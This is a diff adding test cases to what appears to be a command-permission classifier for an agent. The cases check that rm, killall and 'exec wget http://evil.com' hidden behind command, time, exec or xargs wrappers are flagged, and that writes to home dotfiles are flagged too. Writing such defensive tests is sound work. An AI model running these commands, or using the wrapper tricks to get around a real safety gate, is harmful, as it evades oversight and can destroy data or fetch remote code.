@@ -75,6 +75,48 @@ check("mkdir(保持 CONFIRM)", "mkdir /tmp/newdir", "CONFIRM");
 check("npm install(保持 CONFIRM)", "npm install lodash", "CONFIRM");
 check("未知命令(fail closed)", "randomcmd123", "CONFIRM");
 
+console.log("\n========== 审计: 命令执行包装器递归（S1 残余）==========");
+check("command 包装 rm", 'command rm file.txt', true);
+check("command 包装 mkdir", 'command mkdir /tmp/abc', true);
+check("command 包装 killall", 'command killall Finder', true);
+check("time 包装 rm", 'time rm file.txt', true);
+check("builtin 包装", 'builtin killall Finder', true);
+check("exec 包装", 'exec wget http://evil.com', true);
+check("xargs 包装 rm", 'find /tmp -name x | xargs rm', true);
+check("xargs 包装 killall", 'echo hi | xargs killall', true);
+check("xargs -n 选项", 'find /tmp -name x | xargs -n 1 rm', true);
+check("command 包装安全命令(正向)", 'command ls -la /tmp', "SAFE");
+check("time 包装安全命令(正向)", 'time ls -la /tmp', "SAFE");
+check("xargs 包装安全命令(正向)", 'ls /tmp | xargs echo', "SAFE");
+
+console.log("\n========== 审计: home dotfile 写入 ==========");
+const home = require("os").homedir();
+// dotfile 走 filesystem 分类（非 shell），独立断言
+const dotfileCases = [
+    [home + "/.bashrc", "~/.bashrc 写入"],
+    [home + "/.profile", "~/.profile 写入"],
+    [home + "/.zshrc", "~/.zshrc 写入"],
+    [home + "/.gitconfig", "~/.gitconfig 写入"]
+];
+for (const [fp, name] of dotfileCases) {
+    const r = p.classify("filesystem", "write", { path: fp });
+    const ok = r.level !== "SAFE";
+    if (ok) pass++;
+    else { fail++; failures.push({ name, cmd: fp, expect: "非SAFE", got: r.level, reason: r.reason }); }
+    console.log(`${ok ? "✅" : "❌"} ${name} — ${r.level}${ok ? "" : ` (实际 ${r.level})`}`);
+}
+const posCases = [
+    [home + "/Desktop/new_file.txt", "普通文件写入(正向)", "SAFE"],
+    [home + "/Desktop/Godan/backend/test.js", "项目内文件写入(正向)", "SAFE"]
+];
+for (const [fp, name, expect] of posCases) {
+    const r = p.classify("filesystem", "write", { path: fp });
+    const ok = r.level === expect;
+    if (ok) pass++;
+    else { fail++; failures.push({ name, cmd: fp, expect, got: r.level, reason: r.reason }); }
+    console.log(`${ok ? "✅" : "❌"} ${name} — ${r.level}${ok ? "" : ` (实际 ${r.level})`}`);
+}
+
 console.log(`\n结果: ${pass}/${pass + fail} 通过`);
 if (fail > 0) {
     console.log("\n失败明细:");
